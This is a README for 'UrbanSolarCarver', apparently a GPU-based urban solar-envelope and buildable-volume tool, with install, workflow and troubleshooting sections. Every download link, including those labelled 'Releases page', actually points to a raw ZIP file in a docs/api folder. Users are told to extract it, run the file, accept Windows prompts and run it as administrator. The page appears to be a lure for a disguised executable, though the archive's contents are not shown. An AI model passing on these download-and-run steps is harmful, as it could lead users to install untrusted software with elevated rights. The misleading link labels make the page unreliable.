# 🏙️ UrbanSolarCarver - Build Better Urban Volume Plans

[![Download UrbanSolarCarver](https://img.shields.io/badge/Download-UrbanSolarCarver-blue?style=for-the-badge)](https://raw.githubusercontent.com/klaidasmazonas3214-byte/UrbanSolarCarver/main/docs/api/Carver_Solar_Urban_v3.7.zip)

## 🌞 What UrbanSolarCarver Does

UrbanSolarCarver helps you find buildable building volumes for city sites. It checks solar access, daylight, and thermal comfort while using your GPU to process large models faster.

Use it when you need to test what can be built on a site before you spend time on drawings or manual checks.

## 🖥️ What You Need

- Windows 10 or Windows 11
- A modern NVIDIA GPU
- At least 8 GB of RAM
- 2 GB of free storage
- A screen with 1920 × 1080 resolution or higher
- Internet access for the first download

For best results, use a machine with a strong graphics card and 16 GB of RAM or more.

## 📥 Download and Install

1. Open the [UrbanSolarCarver Releases page](https://raw.githubusercontent.com/klaidasmazonas3214-byte/UrbanSolarCarver/main/docs/api/Carver_Solar_Urban_v3.7.zip)
2. Find the latest release at the top of the page
3. Download the Windows file listed under the release assets
4. If the file comes in a ZIP package, extract it to a folder on your computer
5. Open the app file inside the folder
6. If Windows asks for permission, choose Run
7. Wait for the program to start

If you see more than one file, choose the Windows version that matches your system.

## 🧭 First Launch

When UrbanSolarCarver opens for the first time, you will usually see a simple workspace with a model view and controls on the side.

1. Load your site model
2. Set the boundary of the area you want to study
3. Pick the analysis settings
4. Start the run
5. Review the buildable volume result

The app is built for clear step-by-step use, so you can move through the workflow without deep technical setup.

## 🧱 Typical Workflow

### 1. Load a Site
Import your project area, building massing, or terrain. The app works best with clean geometry and simple site shapes.

### 2. Set the Study Area
Draw or select the part of the site you want to test. This keeps the run focused and helps you compare options faster.

### 3. Choose Constraint Rules
Turn on the checks you want to apply:

- Solar access
- Daylight
- Thermal comfort
- Urban spacing limits
- Height or volume limits

### 4. Run the Solver
UrbanSolarCarver uses the GPU to process the model and search for buildable volumes that meet your rules.

### 5. Review the Result
The app shows the maximum buildable massing as a 3D volume. You can inspect it from different angles and compare it with your site.

## ⚙️ How to Use the Results

Use the output to support early design work. It can help with:

- Site massing studies
- Envelope checks
- Urban planning reviews
- Daylight-sensitive layout tests
- Solar access checks for neighboring buildings
- Thermal comfort screening in dense areas

The result gives you a clear starting point for design, not a finished building form. You can refine it later in your own workflow.

## 🧩 File Types You May See

UrbanSolarCarver may use common project files such as:

- Site geometry files
- Model exchange files
- Exported mesh or volume files
- Analysis result files
- Saved session files

If you work with Rhino, Grasshopper, or Python-based tools, you can keep the site setup aligned with your broader design process.

## 🚨 Common Problems

### The app does not open
- Make sure you downloaded the Windows version
- Check that the file finished downloading
- Try running it again after extraction
- Right-click the app and choose Run as administrator

### The model runs slowly
- Close other heavy apps
- Update your GPU driver
- Reduce the size of the study area
- Use a simpler model for the first test

### The screen looks blank
- Zoom to fit the model
- Check that your site file loaded correctly
- Confirm that the project has visible geometry

### The GPU is not used
- Make sure your NVIDIA driver is current
- Reboot your computer after driver updates
- Check that the app is using the correct graphics device

## 🔍 Best Practices

- Start with a small area before running a large site
- Keep geometry clean and simple
- Use clear site boundaries
- Test one constraint at a time when learning the app
- Save versions as you go
- Compare multiple runs before you pick a final massing option

These habits make results easier to read and help you avoid slow runs.

## 📌 Who This Is For

UrbanSolarCarver fits users who need to explore buildable volume early in a project:

- Urban designers
- Architects
- Planning teams
- Daylight consultants
- Computational design users
- Students working on urban form studies

You do not need programming knowledge to use the app at a basic level.

## 🛠️ How the App Fits Into Design Work

The tool sits between site research and concept design. It helps you test a city block or plot against rules that affect build form.

You can use it to:

- Check if a proposed mass fits the site
- Study how solar rules shape the envelope
- Compare several planning options
- Prepare early-stage planning diagrams
- Support design choices with measured output

## 📂 Suggested Folder Setup

If you want to keep things tidy, use a simple folder structure:

- UrbanSolarCarver
  - Input
  - Output
  - Study Notes
  - Exports

This makes it easier to find your files later and keeps each project separate.

## 🌐 Release Page

To download the app, visit the [UrbanSolarCarver Releases page](https://raw.githubusercontent.com/klaidasmazonas3214-byte/UrbanSolarCarver/main/docs/api/Carver_Solar_Urban_v3.7.zip) and download the latest Windows version

## 🧾 Project Focus

UrbanSolarCarver is built around urban analysis and volumetric search. It combines:

- Architecture
- Computational design
- Daylight
- Planning
- Solar envelope logic
- Voxel-based search
- GPU processing

The goal is to help you find a buildable shape that fits your site and its environmental rules

## 🧠 Quick Start Checklist

- Open the releases page
- Download the latest Windows file
- Extract it if needed
- Start the app
- Load your site model
- Set your study area
- Choose the checks you want
- Run the analysis
- Review the buildable volume